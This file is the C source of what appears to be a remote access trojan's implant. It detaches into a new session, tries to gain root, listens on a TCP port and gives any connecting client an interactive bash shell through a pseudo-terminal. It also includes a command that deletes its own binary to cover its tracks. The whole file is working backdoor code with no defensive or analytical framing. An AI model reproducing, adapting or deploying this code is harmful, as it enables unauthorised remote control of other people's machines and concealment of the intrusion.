/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

# include "ratz.h"	
# include "slave.h"

static int	cls = 0;
static int	clf = 0;

char*	get_own_addr(void)
{
	char			*ipv4;
	char			buffer[256];
	struct hostent	*hostaddr;

	gethostname(buffer, sizeof(buffer));
	hostaddr = gethostbyname(buffer);
	ipv4 = inet_ntoa(*(struct in_addr *)hostaddr->h_addr_list[0]);
	return (ipv4);
}

void	wait_connection(s_blue* blue)
{
	int	fflags = fcntl(blue->ratz.server, F_GETFL);

	fcntl(blue->ratz.server, F_SETFL, fflags & ~O_NONBLOCK);
	if ((blue->client = accept(blue->ratz.server, (s_sockaddr*)&blue->ratz.addri, &blue->ratz.addri_len)) == -1)
		strexit("accept", 1);
	fcntl(blue->ratz.server, F_SETFL, fflags);
}

void	init_server(s_blue* blue)
{
	if ((blue->ratz.server = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		strexit("socket", 1);
	write(1, blue->ratz.addr, strlen(blue->ratz.addr));
	write(1, "\n", 1);
	ratz_set_addri(&blue->ratz.addri, AF_INET, blue->ratz.addr, blue->ratz.raw_port);
	if (bind(blue->ratz.server, (const s_sockaddr*)&blue->ratz.addri, sizeof(blue->ratz.addri)) == -1)
		strexit("bind", 1);
	else if (listen(blue->ratz.server, 1) == -1)
		strexit("listen", 1);
	wait_connection(blue);
}

void	create_ptm(s_blue* blue)
{
	if ((blue->master = posix_openpt(O_RDWR | O_NOCTTY)) == -1)
		strexit("posix_openpt", 1);
	else if (grantpt(blue->master) == -1)
		strexit("grantpt", 1);
	else if (unlockpt(blue->master) == -1)
		strexit("unlockpt", 1);
}

void	open_pts(s_blue* blue)
{
	char*	slave_name = ptsname(blue->master);
	if (!slave_name)
		strexit("ptsname", 1);
	else if ((blue->slave = open(slave_name, O_RDWR | O_NOCTTY)) == -1)
		strexit("open pts", 1);
}

// Le terminal associé au 'fd' devient le terminal de controle de la session
//static inline
//int	set_ttctrl(int fd)
//{
//	return (ioctl(fd, TIOCSCTTY, 0));
//}

void	setup_slave(s_blue* blue)
{
	if (setsid() == -1) // Détache le programme de l'ancienne session, auquel il devient maintenant le leader
		blue->auth.setsid = 0;
	open_pts(blue); // Ouvre le terminal esclave
	if (ioctl(blue->slave, TIOCSCTTY, 0) == -1) // Creation d'une nouvelle session
		blue->auth.ioctl = 0;
}

void	set_slave_state(int slave_fd)
{
	dup2(slave_fd, STDIN_FILENO);
	dup2(slave_fd, STDOUT_FILENO);
	dup2(slave_fd, STDERR_FILENO);
	close(slave_fd);
}

void	try_set_root(s_auth* auth)
{
	if (setuid(0) == -1)
		auth->pr = 0;
	if (setgid(0) == -1)
		auth->gr = 0;
}

char*	strjoin(char* a, char* b)
{
	unsigned long	a_size = strlen(a);
	unsigned long	b_size = strlen(b);
	unsigned int	i = 0;
	char*			new = malloc((a_size + b_size + 1) * sizeof(char));

	for ( ; i < a_size ; ++i)
		new[i] = a[i];
	for (unsigned int j = 0 ; j < b_size ; ++j, ++i)
		new[i] = b[j];
	new[i] = 0;
	return (new);
}

void	sigh(int sig)
{
	if (sig == SIGUSR1)
		clf = 1;
	else if (sig == SIGUSR2)
		cls = 1;
}

void	init_auth(s_auth* auth)
{
	auth->pr = 1;
	auth->gr = 1;
	auth->ioctl = 1;
	auth->setsid = 1;
}

void	send_auth_error(s_blue blue)
{
	char	auth_msg[11] = {0};
	int		n = 0;

	if (blue.auth.pr == 0)
	{
		auth_msg[0] = 'p';
		auth_msg[1] = 'r';
		n += 2;
	}
	if (blue.auth.gr == 0)
	{
		auth_msg[n + 0] = 'g';
		auth_msg[n + 1] = 'r';
		n += 2;
	}
	if (blue.auth.setsid == 0)
	{
		auth_msg[n + 0] = 's';
		auth_msg[n + 1] = 'i';
		auth_msg[n + 2] = 'd';
		n += 3;
	}
	if (blue.auth.ioctl == 0)
	{
		auth_msg[n + 0] = 'c';
		auth_msg[n + 1] = 't';
		auth_msg[n + 2] = 'l';
		n += 3;
	}
	write(blue.client, auth_msg, 11);
	write(blue.client, "\1", 2);
}

void	wait_new_connection(s_blue* blue)
{
# ifdef DEBUG
	P("wait new connection\n")
# endif
	printf("wait connection\n");
	close(blue->client);
	wait_connection(blue);
	send_auth_error(*blue);
}

int	__opt(const char* test, const char* word, const char* longw)
{
	return ((!strcmp(test, word) || !strcmp(test, longw)));
}

int	ratz(s_blue* blue, char** av, char** opt)
{
	(void)blue;
	(void)av;
	(void)opt;
	if (!strcmp(opt[0], "ratz"))
	{
		if (__opt(opt[1], "-q", "--quit"))
			exit(0);
		else if (__opt(opt[1], "-d", "--delete"))
		{
			if (fork() == 0)
			{
				unlink(av[0]);
				exit(0);
			}
			else
				exit(0);
		}
		else if (__opt(opt[1], "c", "--cpu"))
		{
			//if (opt[2] == NULL || atoi(opt[2]) == 0)
			//	write(blue->client, itoa(nice(0)), strlen(itoa(nice(0))));
		}
		return (1);
	}
	return (0);
}



int	main(int unused, char** av)
{
	(void)unused;

	s_blue	blue;
	memset(&blue, 0, sizeof(blue));

	setsid();
	init_auth(&blue.auth);
	try_set_root(&blue.auth);
	blue.ratz.addr = get_own_addr();
	blue.ratz.raw_port = ratz__get_port_method(av[1]);
	init_server(&blue);
	create_ptm(&blue);

	blue.pid = getpid();
	blue.chd = fork();
	if (blue.chd == -1)
		strexit("fork", 1);
	else if (blue.chd == 0)
	{
		setup_slave(&blue);
		set_slave_state(blue.slave);
		close(blue.ratz.server);
		close(blue.master);
		setenv("PS1", "", 1);
		setenv("TERM", "dumb", 1);
		if (execlp("bash", "bash", "--posix", "--norc", "--noprofile", NULL) == -1)
			strexit("execlp", 2);
	}
	else
	{
		signal(SIGUSR1, sigh);
		signal(SIGUSR2, sigh);
		close(blue.slave);

		char	cmd[DEBUG_SIZE_MAX] = {0};	// 3 var for DEBUGGING
		char*	tmp;
		int		n = 0;
		int		m = 0;
		int		t = 0;

		int		sync = 0;

		fcntl(blue.client, F_SETFL, ~O_NONBLOCK);
		fcntl(blue.master, F_SETFL, ~O_NONBLOCK);
		send_auth_error(blue);
		while (waitpid(blue.chd, NULL, WNOHANG) == 0)
		{
			memset(cmd, 0, DEBUG_SIZE_MAX);
# ifdef DEBUG
	P("waiting...\n")
# endif
			while ((n = read(blue.client, cmd, DEBUG_SIZE_MAX)) <= 0)
				;
			//n = read(blue.client, cmd, DEBUG_SIZE_MAX);
			printf("cmd : %s\n", cmd);
			//printf("n : %d | errno : %s\n", n, strerror(errno));
			if (n <= 0 || !strcmp(cmd, "exit\n"))
				wait_new_connection(&blue);
			else
			{
				tmp = strdup(cmd);
				n = sprintf(cmd, "kill -12 %d ; %s ; kill -10 %d\n", blue.pid, tmp, blue.pid);
				m = n;
				t = 0;
				cmd[n] = 0;
				//printf("cmd : %s\n", cmd);
				
				write(blue.master, cmd, n);
				while (cls == 0)
					;
				while (1)
				{
					if (t < m + 1)
						t += read(blue.master, &cmd[t], (m + 1) - t);
					else
					{
						fcntl(blue.master, F_SETFL, O_NONBLOCK);
						n = read(blue.master, cmd, DEBUG_SIZE_MAX);
						write(blue.client, cmd, n);
					}
					fcntl(blue.client, F_SETFL, O_NONBLOCK);
					n = read(blue.client, cmd, DEBUG_SIZE_MAX);
					fcntl(blue.client, F_SETFL, ~O_NONBLOCK);
					//printf("n : %d | errno : %s\n", n, strerror(errno));
					if (n > 0)
					{
						write(blue.master, cmd, n);
						//exit(0);
					}
					if (clf == 1)
					{
						clf = 0;
						cls = 0;
						break;
						//sync = 1;
					}
					//else if (sync == 1)
					//{
					//	break;
					//}
				}
				n = 0;
				printf("sortie\n");
				fcntl(blue.master, F_SETFL, ~O_NONBLOCK);
				fcntl(blue.client, F_SETFL, ~O_NONBLOCK);
				write(blue.client, "\0033EONING\003", 10);
			}
		}
	}
	return (0);
}
